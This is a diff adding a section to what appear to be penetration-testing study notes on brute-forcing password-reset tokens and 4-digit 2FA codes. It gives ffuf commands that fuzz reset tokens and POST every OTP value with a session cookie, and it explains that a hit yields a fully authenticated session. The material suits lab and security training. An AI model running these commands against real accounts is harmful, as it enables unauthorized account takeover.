@@ -39,3 +39,14 @@ Verify with `head token.txt`.
 ```
 ffuf -w ./tokens.txt -u http://$domain/reset_password.php?token=FUZZ -fr "The provided token is invalid"
 ```
+# Brute-Forcing 2FA Codes
+
+One of the most common 2FA implementations relies on the user's password and a time-based one-time password (TOTP) provided to the user's smartphone by an authenticator app or via SMS. These TOTPs typically consist only of digits.
+
+```
+seq -w 0 9999 > tokens.txt
+```
+```
+ffuf -w ./tokens.txt -u http://$domain/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=mrjm73bh8e53qcej2744h7k44p" -d "otp=FUZZ" -fr "Invalid 2FA Code"
+```
+With that we will get hits after the session successfully passed the 2FA check because we had supplied the correct TOTP. The first hit was the correct TOTP. Afterward, our session is marked as fully authenticated, so all requests using our session cookie are redirected to the logged in page.
